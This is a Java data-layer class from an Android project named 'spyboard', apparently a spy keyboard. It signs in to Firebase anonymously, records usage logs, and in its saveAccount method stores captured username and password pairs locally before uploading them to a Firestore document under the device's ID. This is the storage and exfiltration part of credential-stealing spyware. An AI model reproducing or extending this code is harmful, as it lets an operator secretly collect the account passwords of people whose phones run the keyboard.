package com.idankorenisraeli.spyboard.data;

import android.content.Context;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.auth.AuthResult;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.firestore.CollectionReference;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.gson.reflect.TypeToken;
import com.idankorenisraeli.spyboard.common.EncryptedSPManager;
import com.idankorenisraeli.spyboard.common.MyApp;
import com.idankorenisraeli.spyboard.data.types.DailyUsageLog;
import com.idankorenisraeli.spyboard.data.types.UsageLog;

import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

public class DatabaseManager {

    //Singleton
    private static DatabaseManager instance = null;


    private final FirebaseFirestore database = FirebaseFirestore.getInstance();
    private final EncryptedSPManager sharedPrefs = EncryptedSPManager.getInstance();
    private final CollectionReference usersRef;

    private final ArrayList<DailyUsageLog> waitingList; //Logs that could not be saved to cloud

    private FirebaseAuth mAuth;
    private FirebaseUser mUser;

    public static void initHelper() {
        if(instance == null)
            instance = new DatabaseManager();
    }


    interface KEYS {
        String USERS = "users";
        String DAILY_LOGS = "daily_logs";
        String ALL_TIME = "all_time";
        String ACCOUNTS = "accounts";
        String TOTAL = "total";

        String UID = "my_uid";
        String USER_NAME = "my_username";

    }

    private DatabaseManager() {
        usersRef = database.collection(KEYS.USERS);
        waitingList = new ArrayList<>();
        initUser();


    }

    private void initUser(){
        mAuth = FirebaseAuth.getInstance();
        mUser = mAuth.getCurrentUser();
        if(mUser == null)
            signIn();

    }

    private void signIn(){
        mAuth.signInAnonymously()
                .addOnCompleteListener(new FirebaseAuthExecute(), new OnCompleteListener<AuthResult>() {
                    @Override
                    public void onComplete(@NonNull Task<AuthResult> task) {
                        if (task.isSuccessful()) {
                            // Sign in success, update UI with the signed-in user's information
                            mUser = mAuth.getCurrentUser();
                        }
                    }
                });
    }

    public static DatabaseManager getInstance() {

        if (instance == null)
            instance = new DatabaseManager();
        return instance;
    }


    /** This will override the current daily log that is saved in db/sp
     *  And replace it with the new one
     * @param log A new daily usage log to save
     */
    public void saveDailyLog(@NonNull DailyUsageLog log) {
        if(getUserName() == null)
            return; // Save only after username is set.

        sharedPrefs.putObject(getDailyLogSPKey(log.getDate()), log);

        getDailyLogDocRef(log.getDate()).set(log)
                .addOnSuccessListener(new OnSuccessListener<Void>() {
                    @Override
                    public void onSuccess(Void aVoid) {
                        //Trying to re-save the waiting logs
                        for (DailyUsageLog waitingLog : waitingList) {
                            getDailyLogDocRef(waitingLog.getDate()).set(waitingLog).addOnSuccessListener(new OnSuccessListener<Void>() {
                                @Override
                                public void onSuccess(Void aVoid) {
                                    // Waiting log is saved, so its not waiting anymore
                                    waitingList.remove(waitingLog);
                                }
                            });
                        }
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {
                        waitingList.add(log);
                    }
                });
    }

    //Saving to both sp + firestore
    public void saveTotalLog(@NonNull UsageLog log) {
        if(getUserName() == null)
            return; // Save only after username is set.

        sharedPrefs.putObject(getTotalLogSPKey(), log);
        getTotalDocRef().set(log);
    }

    public Map<String, String> getAccounts(){
        HashMap<String,String> accounts = sharedPrefs.getMap(getAccountsSPKey(), new TypeToken<HashMap<String,String>>(){});
        if(accounts==null)
            return new HashMap<>();
        return accounts;
    }


    public void saveAccount(String username, String password) {
        if(getUserName() == null)
            return; // Save only after username is set.

        Map<String,String> accounts = getAccounts();

        accounts.put(username, password);

        sharedPrefs.putMap(getAccountsSPKey(), (HashMap<String,String>) accounts);
        getAccountsDocRef().set(accounts);
    }


    /**
     * Load from encrypted sp
     * encrypted Sharedprefs will be always up to date
     * @param date Date of log to load from device
     */
    public DailyUsageLog loadDailyLog(String date) {
        String spKey = getDailyLogSPKey(date);
        return sharedPrefs.getObject(spKey, DailyUsageLog.class);

    }

    public UsageLog loadTotalLog() {
        String spKey = getTotalLogSPKey();
        return sharedPrefs.getObject(spKey, UsageLog.class);
    }

    public String getUserName(){
        String spKey = getUserNameKey();
        return sharedPrefs.getString(spKey, null);
    }


    /**
     * This creates the unique reference of a log in the cloud firestore
     *
     * @param date the of the log to get its ref
     * @return the ref
     */
    private DocumentReference getDailyLogDocRef(String date) {
        return usersRef.document(getUID().concat("/").
                concat(KEYS.DAILY_LOGS).concat("/").concat(date));
    }

    private DocumentReference getAccountsDocRef() {
        return usersRef.document(getUID().concat("/")
                .concat(KEYS.ALL_TIME).concat("/").concat(KEYS.ACCOUNTS));
    }

    private DocumentReference getTotalDocRef() {
        return usersRef.document(getUID().concat("/")
                .concat(KEYS.ALL_TIME).concat("/").concat(KEYS.TOTAL));
    }

    private String getDailyLogSPKey(String date) {
        return EncryptedSPManager.KEYS.SP_KEY_PREFIX + KEYS.DAILY_LOGS + "_" + date;
    }

    private String getAccountsSPKey(){
        return EncryptedSPManager.KEYS.SP_KEY_PREFIX + KEYS.ACCOUNTS;
    }

    private String getTotalLogSPKey() {
        return EncryptedSPManager.KEYS.SP_KEY_PREFIX + KEYS.TOTAL;
    }

    private String getUIDKey(){
        return EncryptedSPManager.KEYS.SP_KEY_PREFIX + KEYS.UID;
    }

    private String getUserNameKey(){
        return EncryptedSPManager.KEYS.SP_KEY_PREFIX + KEYS.USER_NAME;
    }

    public void setInitActivityShown(boolean isShown){
        sharedPrefs.putBoolean(EncryptedSPManager.KEYS.SP_INIT_ACTIVITY_SHOWN, isShown);
    }

    public boolean isInitActivityShown(){
        return sharedPrefs.getBoolean(EncryptedSPManager.KEYS.SP_INIT_ACTIVITY_SHOWN, false);
    }



    /**
     * Each user gets its own unique id for the database
     * this unique id will be saved on shared prefs
     *
     * If there is a name submitted, the uuid will also contain this name at the start
     *
     * @return Current user's unique ID
     */
    private String getUID() {
        String deviceUID = sharedPrefs.getString(getUIDKey(), null);
        if(deviceUID == null){
            deviceUID = UUID.randomUUID().toString();
            sharedPrefs.putString(getUIDKey(), deviceUID);
        }

        if(getUserName()!=null)
            return getUserName() + "_" + deviceUID;
        else
            return deviceUID;
    }

    public void setUserName(@Nullable String myName){
        if(myName!=null && myName.length() > 0){
            String userName = myName
                    .replace(" ", "_")
                    .replace("/", "-")
                    .toLowerCase();
            sharedPrefs.putString(getUserNameKey(), userName);
        }
    }

}
